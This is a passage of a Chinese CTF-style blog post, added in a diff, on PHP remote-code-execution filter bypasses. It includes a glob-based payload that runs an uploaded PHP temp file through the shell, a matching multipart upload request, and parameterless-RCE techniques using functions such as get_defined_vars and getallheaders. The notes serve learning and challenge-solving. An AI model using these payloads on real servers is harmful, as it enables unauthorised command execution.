+<p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p>
+<p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
+</blockquote>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160049068.png" alt="image-20240821160049068"></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160130731.png" alt="image-20240821160130731"></p>
+<p>我们可以利用<code>[@-[]</code>来表示大写字母：<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160212304.png" alt="image-20240821160212304"></p>
+<p>因为只有php临时文件可能有大写</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821171357305.png" alt="image-20240821171357305"></p>
+<p>注意写数据包时不要写错！</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary0Ra0WsQ0aDxSuWXg</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>156</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary0Ra0WsQ0aDxSuWXg</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundary0Ra0WsQ0aDxSuWXg--</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.%20/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[@-[]`%3b?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>tip有可能改目录，查看目录函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>他的正则表达式为<br><code>/[^\W]+\((?R)?\)/</code>，在这里表示递归匹配。</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h3><p>获取环境变量</p>
+<h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><p>打印结果，调试。</p>
+<h3 id="scandir-readfile"><a href="#scandir-readfile" class="headerlink" title="scandir readfile"></a>scandir readfile</h3><p>读取文件</p>
+<h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>把数组指针往下移动一位。</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821173036958.png" alt="image-20240821173036958"></p>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars"></a><strong>get_defined_vars</strong></h3><p>获取定义的所有变量<br><code>cmd=var_dump(next(get_defined_vars()));&amp;a=1</code></p>
+<h3 id="session-start"><a href="#session-start" class="headerlink" title="session_start"></a>session_start</h3><p>启动一个session</p>
+<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h3><p>获取所有的请求头</p>
+<h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h3><p>获取所在目录</p>
+<h3 id="apache-request-headers"><a href="#apache-request-headers" class="headerlink" title="apache_request_headers"></a>apache_request_headers</h3><p>只适用于apache获取请求头。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/02/26/py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Python原型链污染</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">java反序列化</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
